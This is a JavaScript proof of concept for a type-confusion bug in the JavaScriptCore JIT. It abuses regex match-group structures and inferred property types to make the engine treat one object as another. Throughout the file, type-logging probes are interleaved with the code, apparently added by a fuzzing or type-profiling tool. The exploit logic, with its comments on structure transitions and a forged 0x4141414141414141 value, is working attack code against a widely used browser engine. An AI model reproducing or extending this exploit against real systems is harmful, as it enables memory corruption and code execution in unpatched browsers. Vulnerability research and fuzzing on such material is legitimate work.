var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
var Inst39 = 0;
var Inst40 = 0;
var Inst41 = 0;
var Inst42 = 0;
var Inst43 = 0;
var Inst44 = 0;
var Inst45 = 0;
var Inst46 = 0;
var Inst47 = 0;
var Inst48 = 0;
var Inst49 = 0;
var Inst50 = 0;
var Inst51 = 0;
var Inst52 = 0;
var Inst53 = 0;
var Inst54 = 0;
var Inst55 = 0;
var Inst56 = 0;
var Inst57 = 0;
var Inst58 = 0;
var Inst59 = 0;
var Inst60 = 0;
var Inst61 = 0;
var Inst62 = 0;
var Inst63 = 0;
var Inst64 = 0;
var Inst65 = 0;
var Inst66 = 0;
var Inst67 = 0;
var Inst68 = 0;
var Inst69 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
// /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
// The PoC will confuse objX with objY.
// objX will have structure S1, objY structure S2.
let objX = {objProperty: {fetchme: 1234}};
try { if (Inst0 <= 1000 && typeof (objX) != "undefined") {_RecordType("<171,175,4>",(objX)); Inst0++; } } catch(e) {}
let objY = {doubleProperty: 2130562.5098039214};             // 0x4141414141414141 in memory
try { if (Inst1 <= 1000 && typeof (objY) != "undefined") {_RecordType("<214,218,5>",(objY)); Inst1++; } } catch(e) {}

// Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
// `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
try { if (Inst2 <= 1000 && typeof (createArrayWithSlowPutArrayStorage) != "undefined") {_RecordType("<488,522,9>",(createArrayWithSlowPutArrayStorage)); Inst2++; } } catch(e) {}
function createArrayWithSlowPutArrayStorage() {
    let protoWithIndexedAccessors = {};
try { if (Inst3 <= 1000 && typeof (protoWithIndexedAccessors) != "undefined") {_RecordType("<535,560,10>",(protoWithIndexedAccessors)); Inst3++; } } catch(e) {}
try { if (Inst4 <= 1000 && typeof (Object.defineProperty) != "undefined") {_RecordType("<571,592,11>",(Object.defineProperty)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (Object) != "undefined") {_RecordType("<571,577,11>",(Object)); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (protoWithIndexedAccessors) != "undefined") {_RecordType("<593,618,11>",(protoWithIndexedAccessors)); Inst6++; } } catch(e) {}try { if (Inst7 <= 1000 && typeof (get) != "undefined") {_RecordType("<628,631,11>",(get)); Inst7++; } } catch(e) {}
    Object.defineProperty(protoWithIndexedAccessors, 1337, { get() { return 1337; } });

    // Compile a function that will end up creating an array with SlowPutArrayStorage.
try { if (Inst8 <= 1000 && typeof (helper) != "undefined") {_RecordType("<756,762,14>",(helper)); Inst8++; } } catch(e) {}
    function helper(i) {
try { if (Inst9 <= 1000 && typeof (i) != "undefined") {_RecordType("<763,764,14>",(i)); Inst9++; } } catch(e) {}
        // After JIT compilation, this new Array call will construct a normal array (with the
        // original Array prototype) with SlowPutArrayStorage due to profiling information from
        // previous executions (which all ended up transitioning to SlowPutArrayStorage).
try { if (Inst11 <= 1000 && typeof (Array) != "undefined") {_RecordType("<1068,1073,18>",(Array)); Inst11++; } } catch(e) {}
        let a = new Array;
try { if (Inst10 <= 1000 && typeof (a) != "undefined") {_RecordType("<1060,1061,18>",(a)); Inst10++; } } catch(e) {}
try { if (Inst12 <= 1000 && typeof (i) != "undefined") {_RecordType("<1087,1088,19>",(i)); Inst12++; } } catch(e) {}
        if (i > 0) {
            // Convert the array to SlowPutArrayStorage by installing a prototype with indexed
            // accessors. This object can, however, not be used directly as the prototype is
            // different and thus the structure has changed.
try { if (Inst13 <= 1000 && typeof (Object.setPrototypeOf) != "undefined") {_RecordType("<1357,1378,23>",(Object.setPrototypeOf)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (Object) != "undefined") {_RecordType("<1357,1363,23>",(Object)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (a) != "undefined") {_RecordType("<1379,1380,23>",(a)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (protoWithIndexedAccessors) != "undefined") {_RecordType("<1382,1407,23>",(protoWithIndexedAccessors)); Inst16++; } } catch(e) {}
            Object.setPrototypeOf(a, protoWithIndexedAccessors);
        }
try { if (Inst17 <= 1000 && typeof (a) != "undefined") {_RecordType("<1435,1436,25>",(a)); Inst17++; } } catch(e) {}
        return a;
    }

    for (let i = 1; i < 10000; i++) {
try { if (Inst18 <= 1000 && typeof (i) != "undefined") {_RecordType("<1458,1459,28>",(i)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (i) != "undefined") {_RecordType("<1465,1466,28>",(i)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (i) != "undefined") {_RecordType("<1476,1477,28>",(i)); Inst20++; } } catch(e) {}
try { if (Inst21 <= 1000 && typeof (helper) != "undefined") {_RecordType("<1491,1497,29>",(helper)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (i) != "undefined") {_RecordType("<1498,1499,29>",(i)); Inst22++; } } catch(e) {}
        helper(i);
    }

try { if (Inst23 <= 1000 && typeof (helper) != "undefined") {_RecordType("<1520,1526,32>",(helper)); Inst23++; } } catch(e) {}
    return helper(0);
}

// Helper object using inferred types.
let obj = {};
try { if (Inst24 <= 1000 && typeof (obj) != "undefined") {_RecordType("<1577,1580,36>",(obj)); Inst24++; } } catch(e) {}
obj.inlineProperty1 = 1337;
try { if (Inst25 <= 1000 && typeof (obj.inlineProperty1) != "undefined") {_RecordType("<1587,1606,37>",(obj.inlineProperty1)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (obj) != "undefined") {_RecordType("<1587,1590,37>",(obj)); Inst26++; } } catch(e) {}
obj.inlineProperty2 = 1338;
try { if (Inst27 <= 1000 && typeof (obj.inlineProperty2) != "undefined") {_RecordType("<1615,1634,38>",(obj.inlineProperty2)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (obj) != "undefined") {_RecordType("<1615,1618,38>",(obj)); Inst28++; } } catch(e) {}
try { if (Inst31 <= 1000 && typeof (objX) != "undefined") {_RecordType("<1662,1666,39>",(objX)); Inst31++; } } catch(e) {}
obj.oolProperty1 = objX;        // Inferred type of 'oolProperty1' will be ObjectWithStructure S1.
try { if (Inst29 <= 1000 && typeof (obj.oolProperty1) != "undefined") {_RecordType("<1643,1659,39>",(obj.oolProperty1)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (obj) != "undefined") {_RecordType("<1643,1646,39>",(obj)); Inst30++; } } catch(e) {}
// 'obj' now has structure S3.

// Create the same structure (S4) that will later (when having a bad time) be used as
// regExpMatchesArrayWithGroupsStructure. Since property values are assigned during the initial
// structure transition, inferred types for all property values are created.
try { if (Inst33 <= 1000 && typeof (createArrayWithSlowPutArrayStorage) != "undefined") {_RecordType("<2041,2075,45>",(createArrayWithSlowPutArrayStorage)); Inst33++; } } catch(e) {}
let a = createArrayWithSlowPutArrayStorage();       // a has Structure S4,
try { if (Inst32 <= 1000 && typeof (a) != "undefined") {_RecordType("<2037,2038,45>",(a)); Inst32++; } } catch(e) {}
a.index = 42;                                       // S5,
try { if (Inst34 <= 1000 && typeof (a.index) != "undefined") {_RecordType("<2108,2115,46>",(a.index)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (a) != "undefined") {_RecordType("<2108,2109,46>",(a)); Inst35++; } } catch(e) {}
a.input = "foobar";                                 // S6,
try { if (Inst36 <= 1000 && typeof (a.input) != "undefined") {_RecordType("<2167,2174,47>",(a.input)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (a) != "undefined") {_RecordType("<2167,2168,47>",(a)); Inst37++; } } catch(e) {}
try { if (Inst40 <= 1000 && typeof (obj) != "undefined") {_RecordType("<2237,2240,48>",(obj)); Inst40++; } } catch(e) {}
a.groups = obj;                                     // and S7.
try { if (Inst38 <= 1000 && typeof (a.groups) != "undefined") {_RecordType("<2226,2234,48>",(a.groups)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (a) != "undefined") {_RecordType("<2226,2227,48>",(a)); Inst39++; } } catch(e) {}
// The inferred type for the .groups property will be ObjectWithStructure S3.

// Inferred type for this property will be ObjectWithStructure S7.
try { if (Inst42 <= 1000 && typeof (a) != "undefined") {_RecordType("<2444,2445,52>",(a)); Inst42++; } } catch(e) {}
global = a;
try { if (Inst41 <= 1000 && typeof (global) != "undefined") {_RecordType("<2435,2441,52>",(global)); Inst41++; } } catch(e) {}

// Must assign twice so the JIT uses the inferred type instead of assuming that
// the property is constant and installing a replacement watchpoint to
// deoptimize whenever the property is replaced.
try { if (Inst44 <= 1000 && typeof (a) != "undefined") {_RecordType("<2657,2658,57>",(a)); Inst44++; } } catch(e) {}
global = a;
try { if (Inst43 <= 1000 && typeof (global) != "undefined") {_RecordType("<2648,2654,57>",(global)); Inst43++; } } catch(e) {}

// Have a bad time. This will attempt to recreate the global regExpMatchesArrayWithGroupsStructure
// (to use an array with SlowPutArrayStorage), but since the same structure transitions were
// performed before, it will actually reuse the existing structure S7. As no property values are
// assigned, all inferred types for structure S7 will still be valid.
try { if (Inst45 <= 1000 && typeof (Object.defineProperty) != "undefined") {_RecordType("<3020,3041,63>",(Object.defineProperty)); Inst45++; } } catch(e) {}try { if (Inst46 <= 1000 && typeof (Object) != "undefined") {_RecordType("<3020,3026,63>",(Object)); Inst46++; } } catch(e) {}try { if (Inst47 <= 1000 && typeof (Array.prototype) != "undefined") {_RecordType("<3042,3057,63>",(Array.prototype)); Inst47++; } } catch(e) {}try { if (Inst48 <= 1000 && typeof (Array) != "undefined") {_RecordType("<3042,3047,63>",(Array)); Inst48++; } } catch(e) {}try { if (Inst49 <= 1000 && typeof (get) != "undefined") {_RecordType("<3067,3070,63>",(get)); Inst49++; } } catch(e) {}
Object.defineProperty(Array.prototype, 1337, { get() { return 1337; } });

// Compile a function that uses the inferred value of 'global' to omit type checks.
try { if (Inst50 <= 1000 && typeof (hax) != "undefined") {_RecordType("<3188,3191,66>",(hax)); Inst50++; } } catch(e) {}
function hax() {
try { if (Inst51 <= 1000 && typeof (global.groups.oolProperty1.objProperty.fetchme) != "undefined") {_RecordType("<3207,3253,67>",(global.groups.oolProperty1.objProperty.fetchme)); Inst51++; } } catch(e) {}try { if (Inst52 <= 1000 && typeof (global.groups.oolProperty1.objProperty) != "undefined") {_RecordType("<3207,3245,67>",(global.groups.oolProperty1.objProperty)); Inst52++; } } catch(e) {}try { if (Inst53 <= 1000 && typeof (global.groups.oolProperty1) != "undefined") {_RecordType("<3207,3233,67>",(global.groups.oolProperty1)); Inst53++; } } catch(e) {}try { if (Inst54 <= 1000 && typeof (global.groups) != "undefined") {_RecordType("<3207,3220,67>",(global.groups)); Inst54++; } } catch(e) {}try { if (Inst55 <= 1000 && typeof (global) != "undefined") {_RecordType("<3207,3213,67>",(global)); Inst55++; } } catch(e) {}
    return global.groups.oolProperty1.objProperty.fetchme;
}

for (let i = 0; i < 10000; i++) {
try { if (Inst56 <= 1000 && typeof (i) != "undefined") {_RecordType("<3267,3268,70>",(i)); Inst56++; } } catch(e) {}try { if (Inst57 <= 1000 && typeof (i) != "undefined") {_RecordType("<3274,3275,70>",(i)); Inst57++; } } catch(e) {}try { if (Inst58 <= 1000 && typeof (i) != "undefined") {_RecordType("<3285,3286,70>",(i)); Inst58++; } } catch(e) {}
try { if (Inst59 <= 1000 && typeof (hax) != "undefined") {_RecordType("<3296,3299,71>",(hax)); Inst59++; } } catch(e) {}try { if (Inst60 <= 1000 && typeof (i) != "undefined") {_RecordType("<3300,3301,71>",(i)); Inst60++; } } catch(e) {}
    hax(i);
}

// Create an ObjectWithStructure S7 which violates the inferred type of .groups (and potentially
// other properties) due to createRegExpMatchesArray using putDirect.
try { if (Inst62 <= 1000 && typeof ("hax".match) != "undefined") {_RecordType("<3486,3497,76>",("hax".match)); Inst62++; } } catch(e) {}
let match = "hax".match(/(?<oolProperty1>hax)/);
try { if (Inst61 <= 1000 && typeof (match) != "undefined") {_RecordType("<3478,3483,76>",(match)); Inst61++; } } catch(e) {}

// match.groups has structure S8 and so assignments to it won't invalidate inferred types of S7.
try { if (Inst66 <= 1000 && typeof (objY) != "undefined") {_RecordType("<3649,3653,79>",(objY)); Inst66++; } } catch(e) {}
match.groups.oolProperty1 = objY;       // This property overlaps with oolProperty1 of structure S3.
try { if (Inst63 <= 1000 && typeof (match.groups.oolProperty1) != "undefined") {_RecordType("<3621,3646,79>",(match.groups.oolProperty1)); Inst63++; } } catch(e) {}try { if (Inst64 <= 1000 && typeof (match.groups) != "undefined") {_RecordType("<3621,3633,79>",(match.groups)); Inst64++; } } catch(e) {}try { if (Inst65 <= 1000 && typeof (match) != "undefined") {_RecordType("<3621,3626,79>",(match)); Inst65++; } } catch(e) {}

// The inferred type for 'global' is ObjectWithStructure S4 so watchpoints will not be fired.
try { if (Inst68 <= 1000 && typeof (match) != "undefined") {_RecordType("<3826,3831,82>",(match)); Inst68++; } } catch(e) {}
global = match;
try { if (Inst67 <= 1000 && typeof (global) != "undefined") {_RecordType("<3817,3823,82>",(global)); Inst67++; } } catch(e) {}

// Trigger the type confusion.
try { if (Inst69 <= 1000 && typeof (hax) != "undefined") {_RecordType("<3865,3868,85>",(hax)); Inst69++; } } catch(e) {}
hax();

